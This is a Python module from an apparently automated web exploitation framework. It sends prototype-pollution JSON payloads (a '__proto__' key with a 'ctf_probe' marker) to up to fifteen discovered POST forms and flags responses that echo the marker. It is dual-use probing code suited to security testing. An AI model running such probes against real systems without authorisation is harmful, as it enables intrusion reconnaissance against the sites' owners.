from __future__ import annotations
import json
from core.module import ExploitModule
from core.models import ExploitResult
from core.payloads import get_payloads
class PrototypePollutionModule(ExploitModule):
    name="Prototype Pollution"; category="client"
    async def run(self,ctx):
        evidence=[];probes=get_payloads(self.name)
        forms=[f for f in (ctx.artifacts.get("recon.forms",[]) or []) if f.get("method")=="POST"]
        for form in forms[:15]:
            action=form.get("action") or ctx.target.url
            for i,payload in enumerate(probes,1):
                ctx.logger(f"[payload {i}/{len(probes)}] Prototype Pollution: {payload}")
                body=json.dumps({"__proto__":{"ctf_probe":"v3"},"payload":payload})
                try:
                    r=await ctx.http.request("POST",action,headers={"Content-Type":"application/json"},content=body,follow_redirects=False)
                    evidence.append(f"{action} -> {r.status_code}, {len(r.text)} bytes")
                    low=r.text.lower()
                    if "ctf_probe" in low or "polluted" in low:
                        ctx.add_finding(action, payload, self.name, f"HTTP {r.status_code}; prototype-pollution marker observed", confidence="high")
                        evidence.append(f"[finding] {action} [{payload}] -> prototype-pollution marker; continuing remaining probes")
                except Exception as exc:evidence.append(str(exc))
        return ExploitResult(self.name,"signal" if ctx.artifacts.get("findings.detected") else "no-signal","Prototype-pollution probes completed (all payloads tested)",evidence="\n".join(evidence[:20]))
